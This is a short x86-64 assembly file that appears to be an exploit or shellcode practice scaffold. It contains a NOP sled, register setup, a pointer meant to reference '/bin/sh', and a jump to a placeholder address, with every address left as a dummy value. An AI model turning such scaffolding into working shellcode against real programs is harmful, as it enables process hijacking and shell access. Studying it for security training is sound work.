section .text
    global _start

_start:
    ; NOP sled (adjust the number of NOPs as needed)
    nop
    nop
    nop
    nop
    nop
    
    mov edi, 0x12345670             ; Set %edi to int a
    mov rsi, 0x123456789abcdef0     ; Set %rsi to long b
    
    ; Assume the address of "/bin/sh" is on the stack at some random address (simulate here)
    ; Replace 0x7fffffffe000 with the actual stack address where "/bin/sh" resides.
    mov rdx, 0x7fffffffe000         ; Load the stack address containing "/bin/sh" into %rdx
    
    ; Store some example address in %rax
    mov rax, 0xdeadbeef             ; Example address (replace with actual address)
    
    ; Jump to the address stored in %rax
    jmp rax                         ; Unconditional jump to the address in %rax
